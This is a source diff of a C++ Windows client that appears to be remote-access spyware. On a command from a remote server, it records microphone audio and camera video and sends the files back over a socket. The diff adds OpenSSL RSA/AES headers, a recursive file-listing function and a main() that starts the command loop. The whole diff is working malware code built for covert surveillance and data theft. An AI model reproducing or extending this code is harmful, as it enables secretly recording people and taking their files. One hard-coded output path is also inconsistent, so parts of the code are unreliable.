@@ -14,7 +14,8 @@
 #include <memory>
 #include <thread>
 #include <filesystem>
-
+#include <openssl/rsa.h>
+#include <openssl/aes.h>
 #pragma warning(disable:4996)
 
 #pragma comment(lib, "ws2_32.lib")
@@ -26,7 +27,11 @@
 
 using namespace std;
 using namespace cv;
-using namespace std::experimental::filesystem::v1;
+namespace fs = std::filesystem;
+//using namespace std::experimental::filesystem::v1;
+
+
+
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 
@@ -202,11 +207,33 @@ int capturingAudio(int seconds) {
     while (time(NULL) != currentTime + seconds + 1) {
     }
     recorder.stop();
-    const sf::SoundBuffer & buffer = recorder.getBuffer();
+    const sf::SoundBuffer& buffer = recorder.getBuffer();
     buffer.saveToFile("C:\\C projects\\mic output.ogg");
     return 1;
 }
 
+
+vector<string> files(vector<string> vec, string path) {
+    for (const auto& entry : fs::directory_iterator(path)) {
+        try {
+            if (entry.is_directory() == true) {
+                for (auto& p : fs::recursive_directory_iterator(entry.path().string()))
+                    if (!p.is_directory())
+                        vec.push_back(p.path().string());
+            }
+            else {
+                vec.push_back(entry.path().string());
+            }
+
+        }
+        catch (const std::exception& e) {
+            cout << "Caught exception \"" << e.what() << "\"\n";
+        }
+
+
+    }
+    return vec;
+}
 
 
 
@@ -290,10 +317,10 @@ void Client() {
             capturingAudio(stoi(command));
             send_file_to_server(sock, "C:\\C project\\mic output.ogg");
         }
-        
-        
+
+
         else if (command.find("take camera video") == 0) {
-            command = command.substr(18 , command.size() -1);
+            command = command.substr(18, command.size() - 1);
             cameraCapturing(stoi(command));
             send_file_to_server(sock, "C:\\C projects\\test.mp4");
 
@@ -312,11 +339,5 @@ void Client() {
 
 
 int main() {
-    //Client();
-    string path = "C:\\";
-    for (const auto& entry : filesystem::directory_iterator(path)) {
-        std::cout << entry.path() << endl;
-    }
-
+    Client();
 }
-
